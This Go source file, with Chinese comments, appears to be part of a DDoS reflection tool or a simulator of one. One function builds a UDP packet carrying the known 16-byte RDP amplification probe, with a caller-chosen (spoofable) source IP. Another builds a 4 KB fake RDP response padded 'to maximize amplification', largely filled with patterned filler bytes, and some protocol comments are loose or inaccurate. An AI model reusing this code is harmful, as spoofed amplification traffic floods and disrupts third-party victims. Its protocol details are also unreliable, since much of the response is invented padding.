package protocol

import (
    "encoding/binary"
)

// RDPPacket 构造RDP请求包
func RDPPacket(srcIP, dstIP string, srcPort, dstPort int) ([]byte, error) {
    payload := []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
    return BuildUDPPacket(srcIP, dstIP, srcPort, dstPort, payload)
}

// RDPResponseBuffer 生成RDP响应数据
func RDPResponseBuffer() []byte {
    // 真实的RDP协议放大响应大小通常可达4KB左右
    responseSize := 4096
    
    buf := make([]byte, responseSize)

    // TPKT Header (RFC 1006)
    buf[0] = 0x03       // Version
    buf[1] = 0x00       // Reserved
    binary.BigEndian.PutUint16(buf[2:4], uint16(responseSize)) // 正确设置整个数据包长度

    // X.224 Connection Confirm (RFC 2126)
    buf[4] = 0x0D       // 长度域 (TPDU码长度)
    buf[5] = 0xD0       // CC-TPDU类型 (Connection Confirm)
    buf[6] = 0x00       // DST-REF 目标引用 (高字节)
    buf[7] = 0x00       // DST-REF (低字节)
    buf[8] = 0x00       // SRC-REF 源引用 (高字节)
    buf[9] = 0x12       // SRC-REF (低字节)
    buf[10] = 0x00      // 类选项
    
    // RDP 协商响应 (MS-RDPBCGR 2.2.1.2)
    offset := 11
    
    // RDP 协商响应标识
    buf[offset] = 0x01      // TYPE - TYPE_RDP_NEG_RSP
    buf[offset+1] = 0x00    // 标志位 - 保留位
    binary.LittleEndian.PutUint16(buf[offset+2:offset+4], 0x0008) // 长度域
    
    // 协商响应标志 - 支持的安全协议
    binary.LittleEndian.PutUint32(buf[offset+4:offset+8], 0x00000001 | 0x00000002 | 0x00000004 | 0x00000008) 
    // 0x00000001: SSL (TLS 1.0)
    // 0x00000002: 早期安全层
    // 0x00000004: 标准RDP安全层
    // 0x00000008: 增强型RDP安全层
    
    // GCC Conference Create Response PDU
    offset = 19
    
    // Generic Conference Control Header
    buf[offset] = 0x00    // T.124确认PDU类型
    buf[offset+1] = 0x05  // 长度类型和高位长度
    buf[offset+2] = 0x00  // 中位长度
    buf[offset+3] = 0x14  // 低位长度
    
    // Connect-Response
    buf[offset+4] = 0x02  // 确认代码 (1字节) - 成功
    buf[offset+5] = 0x02  // 会议标识 (1字节)
    buf[offset+6] = 0x00  // 高位节点ID
    buf[offset+7] = 0x7C  // 低位节点ID
    buf[offset+8] = 0x27  // 域选择器长度为39
    buf[offset+9] = 0x41  // 用户数据长度为65
    
    // Server Core Data (MS-RDPBCGR 2.2.1.4.2)
    offset = 40
    
    // 服务器版本
    binary.LittleEndian.PutUint16(buf[offset:offset+2], 0x0004)       // RDP版本: 4 - 对应Windows Server 2003/Windows XP
    binary.LittleEndian.PutUint16(buf[offset+2:offset+4], 0x0008)     // 早期能力标志
    binary.LittleEndian.PutUint16(buf[offset+4:offset+6], 0x0001)     // 连接类型
    
    // 服务器能力集
    offset = 60
    
    // 通用能力集 - 最大化放大效果
    for i := 0; i < 12; i++ {
        // 能力集头部 (4字节)
        binary.LittleEndian.PutUint16(buf[offset:offset+2], uint16(i+1))     // 能力集类型
        binary.LittleEndian.PutUint16(buf[offset+2:offset+4], 0x00C8)        // 能力集长度 (200字节)
        
        // 填充能力集数据 (196字节)
        for j := 0; j < 196; j++ {
            buf[offset+4+j] = byte((i * j) % 256)
        }
        
        offset += 200
    }
    
    // 添加大量合法且结构化的填充数据，模拟真实响应
    for i := offset; i < responseSize-8; i += 8 {
        // 使用周期性但不易预测的数据模式
        binary.LittleEndian.PutUint32(buf[i:i+4], uint32(0xDEADBEEF ^ i))
        binary.LittleEndian.PutUint32(buf[i+4:i+8], uint32(0xFEEDFACE ^ (i+4)))
    }
    
    return buf
}